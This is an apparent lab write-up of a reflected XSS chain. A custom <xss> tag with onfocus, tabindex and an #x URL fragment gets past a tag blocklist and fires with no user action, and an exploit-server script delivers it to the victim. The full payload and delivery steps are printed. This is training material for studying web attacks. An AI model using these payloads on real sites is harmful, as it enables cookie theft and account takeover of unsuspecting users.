# Attack Chain — Custom-tag focus XSS with fragment trigger, victim-delivered

## Data flow
```
Attacker stores on exploit server (/exploit):
    <script> location = 'https://LAB/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
   │
   ▼
Victim visits https://exploit-server.net/exploit            [DELIVERY LEG]
   │  script navigates victim tab to the LAB payload URL (with #x)
   ▼
LAB server echoes term VERBATIM (custom tag + handlers unlisted by WAF):
    <h1>0 search results for '<xss id=x onfocus=alert(document.cookie) tabindex=1>'</h1>
   │
   ▼
[SINK] victim parser creates the unknown <xss> element (inert by itself);
tabindex=1 makes it FOCUSABLE (unknown elements aren't by default)
   │
   ▼
[EVENT GATE] initial navigation carries #x → browser auto-scrolls AND auto-focuses
the element with id=x on load → focus event fires with ZERO interaction
   │
   ▼
[TRUST BOUNDARY CROSSED] onfocus handler runs in LAB origin, VICTIM context:
alert(document.cookie) — cookie-reading primitive demonstrated live
   ▼
RESULT: victim-side alert → platform detects → is-solved
```

## Why each piece is necessary
- **Custom tag** (`<xss>`): all standard tags → WAF 400. Unknown elements pass
  because a finite tag blocklist cannot enumerate them — the set-difference win.
- **`onfocus` + `tabindex=1`**: handlers are NOT filtered in this build (unlike the
  prior WAF lab), but focus events need a focusable host; `tabindex` confers
  focusability on the unknown element.
- **`#x` fragment**: manufactures the focus event on LOAD (no click/hover/tab key).
  `autofocus` would also work (`<xss autofocus onfocus=…>`), but the fragment form
  keeps the trigger in the URL — one artifact, fully link-deliverable.
- **`location=` navigation (not iframe)**: same-tab navigation to the payload URL;
  the fragment rides along and focuses post-load. Simpler than iframe-resize and
  matched to a focus (not resize) trigger.
- **`alert(document.cookie)`**: the objective demands the cookie-reading shape —
  it proves data access, not just code execution.

## Expected response sequence (verified)
1. Oracle: `<xss autofocus onfocus=PROBE1>` → 200 + verbatim echo (gap confirmed in
   two requests: reflection + filter-pass).
2. Headless: payload URL with `#x` → `<title>FOCUSMK</title>` (marker variant) —
   auto-focus fires onfocus on load, no interaction.
3. STORE exploit (byte-verified) → DELIVER (302s) → access log shows victim UA →
   banner `is-solved`. (Delivery latency observed: several minutes + re-delivery;
   self-`alert()` in own browser does NOT solve — victim signal required.)